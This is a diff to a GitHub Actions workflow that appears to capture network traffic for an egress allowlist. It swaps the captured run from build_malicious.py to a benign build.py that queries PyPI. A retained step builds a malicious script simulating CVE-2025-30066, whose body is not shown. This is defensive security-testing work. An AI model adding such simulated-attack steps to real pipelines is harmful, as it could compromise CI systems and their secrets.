@@ -49,19 +49,19 @@ jobs:
           [[ -x "$bin_path" ]] || { echo "Not found: $bin_path"; ls -la target/release; exit 1; }
           echo "name=$bin_name" >> "$GITHUB_OUTPUT"
           echo "path=$bin_path" >> "$GITHUB_OUTPUT"
-      # - name: ✍️ Create legitimate build script
-      #   run: |
-      #     cat > build.py << 'EOF'
-      #     import subprocess
-      #     import sys
-      #     import requests
-      #     print(f"Python version: {sys.version}")
-      #     print("Downloading requests library info from PyPI…")
-      #     response = requests.get("https://pypi.org/pypi/requests/json", timeout=10)
-      #     print(f"Downloaded PyPI info: {response.status_code}")
-      #     subprocess.run(["pip", "list"], check=False)
-      #     print("Build completed successfully!")
-      #     EOF
+      - name: ✍️ Create legitimate build script
+        run: |
+          cat > build.py << 'EOF'
+          import subprocess
+          import sys
+          import requests
+          print(f"Python version: {sys.version}")
+          print("Downloading requests library info from PyPI…")
+          response = requests.get("https://pypi.org/pypi/requests/json", timeout=10)
+          print(f"Downloaded PyPI info: {response.status_code}")
+          subprocess.run(["pip", "list"], check=False)
+          print("Build completed successfully!")
+          EOF
       - name: Create malicious build script (simulating CVE-2025-30066)
         run: |
           cat > build_malicious.py << 'EOF'
@@ -109,7 +109,7 @@ jobs:
           sleep 5
           # 3) Do the traffic you actually want whitelisted (during capture!)
           python -m pip install --no-input requests
-          python build_malicious.py
+          python build.py
           # 4) Wait for capture to finish
           echo "Waiting for listener to finish (up to 120s + grace)…"
           timeout "$(( 120 + 30 ))" bash -c 'while tmux has-session -t whitelist 2>/dev/null; do sleep 1; done' || true
